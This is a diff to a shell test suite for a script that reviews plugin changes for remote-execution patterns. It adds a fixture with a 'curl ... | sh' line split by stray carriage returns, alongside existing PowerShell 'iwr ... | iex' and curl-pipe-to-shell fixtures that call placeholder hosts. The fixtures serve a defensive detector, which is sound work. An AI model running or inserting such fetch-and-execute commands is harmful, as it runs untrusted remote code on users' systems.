@@ -536,15 +536,18 @@ for want in "Hosts in added lines|Hosts in added Markdown|https://after-nul.exam
   else failn=$((failn + 1)); echo "FAIL delta review, bytes that are not text (LC_ALL=${utf8:-C}): '$from' misses $text"; sect9 "$from" "$to"; fi
 done
 
-# added lines that end in CR LF, as Windows editors save them: a continuation line is still joined
+# added lines that end in CR LF, as Windows editors save them, or in more than one CR: a continuation line is
+# still joined
 cr="$T/cr"; mkdir -p "$cr/plugins/w/tools" && git -C "$cr" init -q && echo base > "$cr/plugins/w/README.md" \
   && git -C "$cr" add plugins && git -C "$cr" commit -q -m old; crold=$(git -C "$cr" rev-parse HEAD)
 printf 'iwr -UseBasicParsing https://ps-crlf.example/x.ps1 `\r\n  | iex\r\n' > "$cr/plugins/w/tools/setup.ps1"
 printf '#!/bin/sh\r\ncurl -fsSL https://sh-crlf.example/x.sh \\\r\n  | sh\r\n' > "$cr/plugins/w/tools/setup.sh"
+printf '#!/bin/sh\ncurl -fsSL https://two-cr.example/x.sh |\r\r\n  sh\r\n' > "$cr/plugins/w/tools/two.sh"
 git -C "$cr" add plugins && git -C "$cr" commit -q -m new; crnew=$(git -C "$cr" rev-parse HEAD)
 x10=$(bash "$ROOT/scripts/tob-delta-review.sh" "$cr" "$crold" "$crnew" 2>&1 | LC_ALL=C sed -n '/^### Remote-exec patterns/,/^### Files moved unchanged/p')
 for want in "plugins/w/tools/setup.ps1: iwr -UseBasicParsing https://ps-crlf.example/x.ps1 | iex" \
-            "plugins/w/tools/setup.sh: curl -fsSL https://sh-crlf.example/x.sh | sh"; do
+            "plugins/w/tools/setup.sh: curl -fsSL https://sh-crlf.example/x.sh | sh" \
+            "plugins/w/tools/two.sh: curl -fsSL https://two-cr.example/x.sh | sh"; do
   if has "$x10" "$want"; then pass=$((pass + 1)); echo "PASS delta review joins CR LF continuation lines: $want"
   else failn=$((failn + 1)); echo "FAIL delta review does not join CR LF continuation lines: $want"; printf '%s\n' "$x10"; fi
 done
